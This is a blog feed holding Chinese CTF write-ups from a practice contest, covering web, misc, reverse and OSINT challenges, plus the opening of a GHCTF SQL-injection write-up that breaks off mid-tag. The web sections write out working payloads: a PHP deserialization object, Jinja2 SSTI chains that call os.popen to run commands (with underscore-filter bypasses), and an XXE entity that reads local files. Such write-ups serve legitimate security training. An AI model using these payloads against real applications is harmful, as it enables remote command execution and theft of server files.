<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-03-20T04:12:09.826Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>203周末练习赛25/3/15</title>
    <link href="http://example.com/article/2025/03/2025.3.15-practice-wp.html/"/>
    <id>http://example.com/article/2025/03/2025.3.15-practice-wp.html/</id>
    <published>2025-03-15T13:00:00.000Z</published>
    <updated>2025-03-20T04:12:09.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="popp"><a href="#popp" class="headerlink" title="popp"></a>popp</h2><p><img src="1742214012778-2b26baa3-0680-45ee-b4c4-1e56295f0bb1.png" loading="lazy"></p><p>首先，看代码的三个类：Logger、User、Request。还有一个反序列化的入口，通过GET参数data传入，反序列化后的对象会被检查是否存在user属性，并且user的is_admin是否为真，如果是的话就执行系统命令输出flag。</p><p>目标是通过构造一个反序列化的payload，使得$data-&gt;user-&gt;is_admin为真，进而执行system(“cat &#x2F;flag”)。</p><p>首先，分析各个类的魔术方法：</p><p><font style="color:#3370ff;">1.</font><font style="color:#3370ff;">       </font><strong>Logger****类</strong>有一个__destruct方法，在对象销毁时会调用file_put_contents，将内容写入$logFile指定的文件。这里可能需要利用这个方法来触发其他操作，但暂时没想到怎么关联到User的is_admin属性。</p><p><font style="color:#3370ff;">2.</font><font style="color:#3370ff;">       </font><strong>User****类</strong>有一个__wakeup方法，在反序列化时会检查username是否为”admin”，如果是就将is_admin设为1。但是is_admin属性在User类中并没有定义，PHP在这种情况下会动态创建public属性is_admin。所以如果能控制User对象的username为”admin”，那么在反序列化时触发__wakeup后，is_admin会被设为1。</p><p><font style="color:#3370ff;">3.</font><font style="color:#3370ff;">       </font><strong>Request****类</strong>有一个__call魔术方法，当调用不存在的方法时触发，这里会调用call_user_func，参数是$this-&gt;handler和$name。如果能够控制$this-&gt;handler，可能可以执行任意函数。</p><p>**1. **</p><p>通过反序列化控制$data-&gt;user-&gt;is_admin为1，触发system(“cat &#x2F;flag”)。</p><p>User::__wakeup()会在反序列化时检查username &#x3D;&#x3D;&#x3D; “admin”，若成立则动态设置is_admin &#x3D; 1。</p><p>需构造User对象，使其username属性为”admin”。</p><p>在网上找的参考代码</p><p><img src="1742214012913-381db322-3f37-4586-9ddc-3d1bd49f8a4a.png" loading="lazy"></p><p>*<em>2. <strong><strong>构造</strong></strong>Payload</em>*</p><p>通过直接控制User对象的属性满足条件：</p><p><img src="1742214012915-d51dfadd-f183-485f-bcc4-db3d155030d0.png" loading="lazy"></p><p>O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3BO%3A4%3A%22User%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3B%7D%7D</p><p>**3. **<strong>利用链验证</strong></p><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><strong>反序列化流程</strong>：</p><p><font style="color:#3370ff;">a.</font><font style="color:#3370ff;">       </font>反序列化stdClass对象，其user属性指向User对象。</p><p><font style="color:#3370ff;">b.</font><font style="color:#3370ff;">      </font>User::__wakeup()触发，因username为”admin”，动态设置is_admin &#x3D; 1。</p><p><font style="color:#3370ff;">c.</font><font style="color:#3370ff;">       </font>条件$data-&gt;user-&gt;is_admin为真，执行system(“cat       &#x2F;flag”)。</p><p>stdClass是PHP的一个基类，几乎所有的类都继承这个类，任何时候都可以被new，可以让一个变量成为一个对象（object）。</p><p>*<em>4. <strong><strong>完整</strong></strong>Payload</em>*</p><p>将生成的序列化字符串作为data参数传递：?data&#x3D; O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3BO%3A4%3A%22User%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3B%7D%7D</p><h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h2><p><img src="1742214012859-5a0a0b8e-8d95-40e7-9ec1-f1f86a1c70d7.png" loading="lazy"></p><p>3</p><table><thead><tr><th><font style="color:#646a73;">PHP   </font><font style="color:black;">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</font></th></tr></thead></table><p><img src="1742214012999-4a47e650-5345-4140-b95a-756381babef8.png" loading="lazy"></p><p><img src="1742214013202-3e9ed5a9-3ef2-4f0d-957c-7a056b409d26.png" loading="lazy"></p><hr><h2 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h2><p>第一种</p><p>首先进行测试查看ssti模板注入的引擎类型</p>49       # Jinja2/Twig返回49  <p>${7<em>7}        # Freemarker返回49<br>#{7</em>7}        # Velocity返回49<br>&lt;%&#x3D; 7*7 %&gt;    # ERB（Ruby）返回49</p><p><img src="1742215433487-8f7e929f-61af-4b4e-bdf4-a2d1b1613f16.png" loading="lazy"></p><p>确定引擎类型后</p><p><strong>获取基类</strong>：通过字符串对象的继承链找到基类（如<font style="color:black;background-color:#eff0f1;">object</font>）</p><pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1] &#125;&#125;  # 输出 &lt;class &#39;object&#39;&gt;</code></pre><p><img src="1742215433571-32971e2f-eef8-4100-ab89-a9afe2813dc0.png" loading="lazy"></p><p><strong>遍历子类</strong>：查找包含危险方法的子类（如<font style="color:black;background-color:#eff0f1;">os._wrap_close</font>）</p><pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1].__subclasses__() &#125;&#125;</code></pre><p><img src="1742215434718-4f08db6e-a3d5-4b0d-8e62-85d343a55960.png" loading="lazy"></p><p><strong>访问</strong><font style="color:black;background-color:#eff0f1;"><strong>os</strong></font><strong>模块</strong>：通过子类的<font style="color:black;background-color:#eff0f1;"><strong>init</strong>.<strong>globals</strong></font>获取<font style="color:black;background-color:#eff0f1;">os</font>模块。</p><pre><code class="language-python">&#123;&#123;   ''.__class__.__mro__[1]  .__subclasses__()[X]        # X为os._wrap_close的索引  .__init__.__globals__['os']  .popen('id').read()&#125;&#125;</code></pre><p>第二种直接输入</p><pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__'].open('/flag').read() &#125;&#125;</code></pre><h2 id="sstiPro"><a href="#sstiPro" class="headerlink" title="sstiPro"></a>sstiPro</h2><p>打开环境</p><p><img src="1742215524802-cf166538-ae41-44aa-9c66-720540b1da76.png" loading="lazy"></p><p>有附件打开查看一下发现存在许多过滤</p><p>思考如何绕过</p><p><img src="1742215524941-c0431a0e-11bd-40ad-8c3b-37cf0000bcd8.png" loading="lazy"></p><p><img src="1742215524910-02259e55-58ae-45e3-beac-442459aea2d5.png" loading="lazy"></p><p>**1. ****<font style="color:black;background-color:#bbbfc4;">lipsum</font>**<strong>方法</strong></p><p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p><pre><code>lipsum</code></pre><p><font style="color:black;background-color:#bbbfc4;">lipsum</font>是一个在 Jinja2 环境中可能存在的变量。通常，在 Jinja2 中，如果攻击者能够控制模板输入，就可以利用环境中已有的变量来展开攻击。这里假设<font style="color:black;background-color:#bbbfc4;">lipsum</font>是一个可以访问到<font style="color:black;background-color:#bbbfc4;">globals</font>属性的对象。</p><p>**2.Jinja2 <strong><strong>模板引擎的</strong></strong><font style="color:black;background-color:#eff0f1;">attr</font>**<strong>过滤器</strong></p><p>在 Jinja2 模板引擎中，<font style="color:black;background-color:#bbbfc4;">attr</font>是一个过滤器，它的作用是访问对象的属性或者方法。其语法格式为<font style="color:black;background-color:#bbbfc4;">对象</font><font style="color:black;background-color:#bbbfc4;">|attr(“</font><font style="color:black;background-color:#bbbfc4;">属性名或方法名</font><font style="color:black;background-color:#bbbfc4;">“)</font>。</p><p><strong>3.****<font style="color:black;background-color:#eff0f1;">attr(“<strong>globals</strong>“)</font></strong></p><p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p><pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)</code></pre><p><font style="color:black;background-color:#bbbfc4;">attr</font>是 Jinja2 中的一个过滤器，用于访问对象的属性。<font style="color:black;background-color:#bbbfc4;">globals</font>是 Python 中函数或方法对象的一个特殊属性，它指向定义该函数或方法的全局命名空间。通过这个操作，代码尝试获取<font style="color:black;background-color:#bbbfc4;">lipsum</font>对象所在的全局命名空间。</p><p><font style="color:black;background-color:#bbbfc4;">attr(“<strong>globals</strong>“)</font>：从<font style="color:black;background-color:#bbbfc4;">lipsum</font>对象中获取<font style="color:black;background-color:#bbbfc4;">globals</font>属性。</p><p><font style="color:black;background-color:#fff67a;">这里的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把</font><font style="color:black;background-color:#fff67a;">lipsum</font><font style="color:black;background-color:#fff67a;">对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“<strong>globals</strong>“)</font><font style="color:black;background-color:#fff67a;">过滤器进行处理，然后返回全局命名空间对象</font>。</p><p>**4. ****<font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)(“os”)</font>**</p><p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p><pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)</code></pre><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">getitem</font>是 Python 中的一个魔术方法，用于实现对象的索引操作。在这个上下文中，<font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)</font>是获取全局命名空间对象的<font style="color:black;background-color:#bbbfc4;">getitem</font>方法。</p><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)</font>：从全局命名空间对象中获取<font style="color:black;background-color:#bbbfc4;">getitem</font>方法。</p><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">(“os”)</font>是调用这个<font style="color:black;background-color:#bbbfc4;">getitem</font>方法，并传入参数<font style="color:black;background-color:#bbbfc4;">“os”</font>，目的是从全局命名空间中获取<font style="color:black;background-color:#bbbfc4;">os</font>模块对象。</p><p><font style="color:black;background-color:#fff67a;">此处的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把全局命名空间对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“<strong>getitem</strong>“)</font><font style="color:black;background-color:#fff67a;">过滤器，进而获取</font><font style="color:black;background-color:#fff67a;">os</font><font style="color:black;background-color:#fff67a;">模块对象。</font></p><p>**5. ****<font style="color:black;background-color:#bbbfc4;">attr(“popen”)(“cat &#x2F;f*”)</font>**</p><p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p><pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)|attr(&quot;read&quot;)()</code></pre><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“popen”)</font>是获取<font style="color:black;background-color:#bbbfc4;">os</font>模块对象的<font style="color:black;background-color:#bbbfc4;">popen</font>方法。<font style="color:black;background-color:#bbbfc4;">os.popen</font>是 Python 中用于执行系统命令的函数，它会返回一个文件对象，通过该对象可以读取命令的输出。</p><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">(“cat &#x2F;f*”)</font>是调用<font style="color:black;background-color:#bbbfc4;">popen</font>方法并传入系统命令<font style="color:black;background-color:#bbbfc4;">cat &#x2F;f*</font>，从而执行该命令。</p><p><font style="color:black;background-color:#fff67a;">这里的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把</font><font style="color:black;background-color:#fff67a;">os</font><font style="color:black;background-color:#fff67a;">模块对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“popen”)</font><font style="color:black;background-color:#fff67a;">过滤器，然后执行系统命令。</font></p><p>**6. ****<font style="color:black;background-color:#eff0f1;">attr(“read”)()</font>**</p><p>jinja2</p><pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)|attr(&quot;read&quot;)()</code></pre><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“read”)</font>是获取<font style="color:black;background-color:#bbbfc4;">popen</font>方法返回的文件对象的<font style="color:black;background-color:#bbbfc4;">read</font>方法。</p><p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">()</font>是调用<font style="color:black;background-color:#bbbfc4;">read</font>方法，将命令执行的输出内容读取出来。</p><p><font style="color:black;background-color:#fff67a;">此处的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把文件对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“read”)</font><font style="color:black;background-color:#fff67a;">过滤器，进而读取命令输出。</font></p><p>**7. ****<font style="color:black;background-color:#bbbfc4;">print</font>**<strong>函数</strong></p><p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p><pre><code class="language-python">&#123;%print(lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /f*")|attr("read")())%&#125;</code></pre><p><font style="color:black;background-color:#bbbfc4;">print</font>是 Jinja2 中的一个函数，用于将表达式的结果输出到页面上。所以，最终会将执行<font style="color:black;background-color:#bbbfc4;">cat &#x2F;f*</font>命令的输出结果显示在页面上。</p><p>最后因为下划线被过滤了所以需要进行<font style="color:#8f959e;background-color:#bbbfc4;">Unicode</font><font style="color:#8f959e;background-color:#bbbfc4;">编码</font></p><pre><code class="language-python">class_name = &quot;填入字符串&quot;unicode_class_name = &#39;&#39;.join([&#39;\\u&#123;:04x&#125;&#39;.format(ord(char)) for char in class_name])print(unicode_class_name)</code></pre><p><img src="1742215524884-83152f36-50e9-490a-a149-f37f7fdd902d.png" loading="lazy"></p><hr><h2 id="readfile-1"><a href="#readfile-1" class="headerlink" title="readfile"></a>readfile</h2><p><img src="1742213856538-c2554eb0-0e85-4051-bfb5-405ad3d27ccb.png" loading="lazy"></p><p>3</p><pre><code class="language-php">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p><img src="1742213856714-df557a52-c122-46c7-b766-97454aace05f.png" loading="lazy"></p><p><img src="1742213856881-7ce3dfdf-030e-4555-ac87-fff799449f05.png" loading="lazy"></p><h2 id="xxx"><a href="#xxx" class="headerlink" title="(&gt;!xxx!&lt;)"></a>(&gt;!xxx!&lt;)</h2><p><img src="1742432622314-51237bc8-539d-4601-8f3c-d70eb103beeb.png" loading="lazy"></p><p>首先拿到题目发现flask,xml,大概就知道这是一道XXE漏洞，XXE漏洞就是XML外部实体注入。</p><p>首先我们直接抓包</p><p><img src="1742432622742-3837972d-40e5-4c01-be0e-da97b0a5fd3c.png" loading="lazy"></p><p>观察得出有两个路由，一看就知道用的是203ctf路由，然后有题目得知用post传参</p><p><img src="1742432622542-ee43df7c-9244-4ae0-af4b-2665650fbe91.png" loading="lazy"></p><p><img src="1742432622430-d405715b-5ee2-4ada-9d47-07546b591bd3.png" loading="lazy"></p><p>直接使用xxeXXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。</p><p>这里使用普通实体声明，格式如下</p><p><img src="1742432622326-ce366b3d-f1eb-44d3-bd78-d2e970a7c83c.png" loading="lazy"></p><p><font style="color:black;background-color:#eff0f1;"><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///ffffffffffffffffff1111111111111111111114444444444444499999999999999'>]&gt;<root><name>&xxe;</name></root></font></p><p><font style="color:black;background-color:#eff0f1;"><!DOCTYPE root [</font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">    </font><font style="color:black;background-color:#eff0f1;"><!ENTITY xxe SYSTEM "file:///flag"></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">]&gt;</font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;"><root></root></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">    </font><font style="color:black;background-color:#eff0f1;"><name>&xxe;</name></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;"></font></font></p><p>因为使用的是post传参，所以要进行url编码</p><p><img src="1742432622652-686473ec-518e-4206-80d2-56da9e60f476.png" loading="lazy"></p><p><img src="1742432622949-fa6397bc-3b96-4203-9298-a04ae5752b14.png" loading="lazy"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="《声音迷宫》"><a href="#《声音迷宫》" class="headerlink" title="《声音迷宫》"></a>《声音迷宫》</h2><p>1.打开题目下载附件，得到一段wav音频文件，尝试听取音频内容，感到非常奇怪。</p><p><img src="1742218143835-307c11be-910d-413f-a098-a565750bf302.png" loading="lazy"></p><p>2.将音频慢放后感觉音频疑似倒放。</p><p>3.使用在线工具将此段音频倒放，得到flag。</p><p>在线工具：<a href="https://audiotrimmer.com/cn/online-mp3-reverser/">https://audiotrimmer.com/cn/online-mp3-reverser/</a></p><p>flag{reverse_audio}</p><h2 id="盗梦空间"><a href="#盗梦空间" class="headerlink" title="盗梦空间"></a>盗梦空间</h2><p><img src="1742216259988-3289932e-31a1-433b-84bf-f96ec08b3afb.png" loading="lazy"></p><p>将图片拖入随波逐流发现有隐藏文件</p><p><img src="1742216257996-a6b7c04b-bebf-42c3-81c1-a5c6e782aafa.png" loading="lazy"></p><p>试着Binwalk文件提取，提取失败，改用foremost提取</p><p><img src="1742216257899-6a554337-ed1b-4fe9-a09e-19b8596bd410.png" loading="lazy"></p><p>得到了一个相似图片</p><p><img src="1742216262574-5ad751d3-5474-4e77-bd6f-ac2d2a74c8a6.png" loading="lazy"></p><p>题目提示要进行比较，用Beyond Compare比较图片，只比较图片未找到有用信息</p><p>试着比较两张图片的十六进制，在左半部分红色区域找到了flag</p><p><img src="1742216258466-ac512520-092c-4f18-b39c-88486bfeaf66.png" loading="lazy"></p><h2 id="《小黑子露出鸡脚了吧》"><a href="#《小黑子露出鸡脚了吧》" class="headerlink" title="《小黑子露出鸡脚了吧》"></a>《小黑子露出鸡脚了吧》</h2><p>首先下载附件</p><p><img src="1742216167911-6d2414ee-bb40-4422-bb53-0fab767fc5b4.png" loading="lazy"></p><p><img src="1742216168583-36629c57-bd42-484e-839b-1e31e5be821f.png" loading="lazy"></p><p>直接将该附件丢到随波逐流</p><p><img src="1742216168217-27361280-7ef0-463e-8d90-1a2f9da41d62.png" loading="lazy"></p><p>使用Binwalk文件提取</p><p><img src="1742216168882-5537668e-1ca9-4cf1-a04f-1410787d94f2.png" loading="lazy"></p><p><img src="1742216168501-1154afea-3fa8-4eda-a024-d1c226a382ae.png" loading="lazy"></p><p>成功提取出_坤哥.docx.extracted文件</p><p><img src="1742216168682-2e311c92-c516-44fd-99cb-a7d9e7d34b2c.png" loading="lazy"></p><p><img src="1742216168712-d5fe30ad-79c4-4e09-af5b-40824a054969.png" loading="lazy"></p><p>将文件中的图片再次拖入随波逐流</p><p><img src="1742216169019-9ea5e128-3975-4559-915e-fe0a5fe848fa.png" loading="lazy"></p><p>再次提取文件</p><p><img src="1742216169114-b604d976-9f81-40af-a7a7-c9158a22ce25.png" loading="lazy"></p><p><img src="1742216169010-a0c97218-70c2-423d-8779-cfcb68b18962.png" loading="lazy"></p><p>然后就是找密码</p><p>开始试了把文件丢进010，但是没有发现什么，然后直接把体图片托在谷歌里面，</p><p><img src="1742216169934-3515d179-41db-4a7c-a175-0686c5deae4a.png" loading="lazy"></p><p><img src="1742216169343-72c8c091-6a65-41b8-a677-a4742f7659c7.png" loading="lazy"></p><p>解码</p><p><img src="1742216169651-4a8e7cc3-1fd7-4487-aa4e-5face3984f32.png" loading="lazy"></p><p>试了一下一个显示出来password为ikunikun</p><p>也就是前面压缩包的密码</p><h2 id="聪明人"><a href="#聪明人" class="headerlink" title="聪明人"></a>聪明人</h2><p>下载附件很明显的特点应该是零宽字符</p><p><img src="1742215632828-13d0bcfd-3cfc-4ea6-b3d0-4bff36539aba.png" loading="lazy"></p><p>网站：<a href="http://330k.github.io/misc_tools/unicode_steganography.js">http://330k.github.io/misc_tools/unicode_steganography.js</a></p><p><img src="1742215633081-35de9eea-2cb9-4c27-a7a5-1a5764f5b3fc.png" loading="lazy"></p><p>解码后发现base64的编码</p><p>所以放入工具解码得到flag</p><p><img src="1742215633167-73e53de2-00ce-4368-a13f-573307f1663c.png" loading="lazy"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>拿到附件放die里</p><p><img src="1742216527574-c99f6391-8fc2-4b98-bae1-81af1ad1dea5.png" loading="lazy"></p><p>IDA打开</p><p><img src="1742216527491-5761d125-2d2b-4218-895a-d77159c5d945.png" loading="lazy"></p><p>直接解密</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4])&#123;    uint32_t y, z, sum;    unsigned p, rounds, e;    //加密    if (n &gt; 1)    &#123;        rounds = 6 + 52 / n;        sum = 0;        z = v[n - 1];        do            &#123;                sum += DELTA;                e = (sum &gt;&gt; 2) &amp; 3;                for (p = 0; p&lt;n - 1; p++)                    &#123;                        y = v[p + 1];                        z = v[p] += MX;                    &#125;                y = v[0];                z = v[n - 1] += MX;            &#125; while (--rounds);    &#125;        //解密    else if (n &lt; -1)    &#123;        n = -n;        rounds = 6 + 52 / n;        sum = rounds*DELTA;        y = v[0];        do            &#123;                e = (sum &gt;&gt; 2) &amp; 3;                for (p = n - 1; p&gt;0; p--)                    &#123;                        z = v[p - 1];                        y = v[p] -= MX;                    &#125;                z = v[n - 1];                y = v[0] -= MX;                sum -= DELTA;            &#125; while (--rounds);    &#125;&#125;int main()&#123;    /*    原数据为：               传进去的参数为：    0xbc 0xa5 0xce 0x40     -&gt;0x40cea5bc    0xf4 0xb2 0xb2 0xe7     -&gt;0xe7b2b2f4    0xa9 0x12 0x9d 0x12     -&gt;0x129d12a9    0xae 0x10 0xc8 0x5b     -&gt;0x5bc810ae    0x3d 0xd7 0x06 0x1d     -&gt;0x1d06d73d    0xdc 0x70 0xf8 0xdc     -&gt;0xdcf870dc    */    uint32_t v[6] = &#123;    (unsigned int)0x40CEA5BC, (unsigned int)0xe7b2b2f4,    (unsigned int)0x129d12a9,(unsigned int)0x5bc810ae,    (unsigned int)0x1d06d73d,(unsigned int)0xdcf870dc &#125;;    /*    密钥为字符串&quot;flag&quot;    十六进制表示为 0x66 0x6c 0x61 0x67    于是传进去的参数要转换成 0x67616c66    由于密钥长度为128位，其余需填充0    */    uint32_t const k[4] = &#123;    (unsigned int)0x67616C66, (unsigned int)0x0,    (unsigned int)0X0, (unsigned int)0x0 &#125;;    //n的绝对值表示v的长度，取正表示加密，取负表示解密    int n = sizeof(v) / sizeof(uint32_t);    btea(v, -n, k);    char flag[25]=&#123;0&#125;;    for (int i = 0; i &lt; n; i++)        &#123;            for (int j = 0; j &lt; sizeof(uint32_t) / sizeof(uint8_t); j++)                &#123;                    flag[i*4+j]=(v[i] &gt;&gt; (j * 8)) &amp; 0xFF;                &#125;        &#125;    printf(&quot;%s\n&quot;,flag);    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p>输出结果为flag{CXX_and_++tea}</p><h2 id="常规脱壳"><a href="#常规脱壳" class="headerlink" title="常规脱壳"></a>常规脱壳</h2><p>拿到附件放die里，进行查壳</p><p><img src="1742216450602-52b463c8-6f96-482a-a23f-a48960da8db8.png" loading="lazy"></p><p>发现是有upx壳的，先按常规的upx.exe -d 进行解包</p><p><img src="1742216450529-e6a04f45-5e90-4ea1-b2c6-f07d33605cc7.png" loading="lazy">发现解不了包，应该是魔改后的upx壳，拿010工具进行修改参数</p><p><img src="1742216450787-67b37d63-f032-41c9-a237-17a911b43772.png" loading="lazy"></p><p>修改完成后在执行upx.exe -d </p><p><img src="1742216450671-a79badd5-87d1-4713-bc27-fde9d3dd5881.png" loading="lazy"></p><p>解包成功</p><p>在拿IDA64打开，shift+f12没有重要信息，看主函数</p><p><img src="1742216450742-15dd276e-2a1c-4d63-ad61-c2ecfaa1ff1a.png" loading="lazy"></p><p>然后就是编写脚本，选中v4[0]就可以shift+e转十六进制</p><p><img src="1742216450761-05e5c53c-b14f-4056-b16c-58d94301a170.png" loading="lazy"></p><p>LitCTF{w3lc0me_t0_l1tctf}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="《Instagram地理猎人》"><a href="#《Instagram地理猎人》" class="headerlink" title="《Instagram地理猎人》"></a><strong>《Instagram地理猎人》</strong></h2><p>首先观察图片，上面的牌子应该就是店名，复制店名</p><p><img src="1742217612034-c65adedc-524a-42ad-bb49-5efa3ea89af3.png" loading="lazy"></p><p>在谷歌上去搜索，找到了这家店</p><p><img src="1742217612633-62d2e390-e3c7-43b8-a6a8-685be3a6b7e8.png" loading="lazy"></p><p>刚好找到百分之60的热可可</p><p><img src="1742217612161-eb759c11-9a4c-4116-b9af-19ed18ab5b4a.png" loading="lazy"></p><p>将900kr转换为人名币</p><p><img src="1742217611782-a8b86d89-2f24-458d-a6df-e12511a0d3b7.png" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;popp&quot;&gt;&lt;a href=&quot;#popp&quot; class=&quot;headerlink&quot; title=&quot;popp&quot;&gt;&lt;/a&gt;pop</summary>
      
    
    
    
    <category term="Sec203Team" scheme="http://example.com/categories/Sec203Team/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="203练习赛" scheme="http://example.com/tags/203%E7%BB%83%E4%B9%A0%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2025GHCTF新生赛(悄悄塞国际题)</title>
    <link href="http://example.com/article/2025/03/2025GHCTF-wp.html/"/>
    <id>http://example.com/article/2025/03/2025GHCTF-wp.html/</id>
    <published>2025-03-12T11:00:00.000Z</published>
    <updated>2025-03-20T09:14:53.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GHCTF-2025-SQL"><a href="#GHCTF-2025-SQL" class="headerlink" title="[GHCTF 2025]SQL???"></a>[GHCTF 2025]SQL???</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="https://www.nssctf.cn/problem/6575">https://www.nssctf.cn/problem/6575</a></p><h2 id="题解-wp"><a href="#题解-wp" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>首先打开题目发现是一个很明显的SQL注入（虽然题目已经给了）</p><p><img src="image-1741779758394-1.png" loading="lazy"></p><p>这里可以看到出题人给的提示（每次执行的sql语句），可以看到并不需要闭合，直接跟上查询即可</p><p><img src="1741578068744-58d43714-73ff-46ac-b1a1-23a824faa8c6.png" loading="lazy"></p><p>尝试猜解字段</p><p><img src="1741578324747-ad4d7c11-029c-4953-b5c4-152a9a8f7238.png" loading="lazy"></p><p>一共5列</p><p><img src="1741578434581-cb4a0aa5-6a49-42bb-a379-6ba92165676c.png" 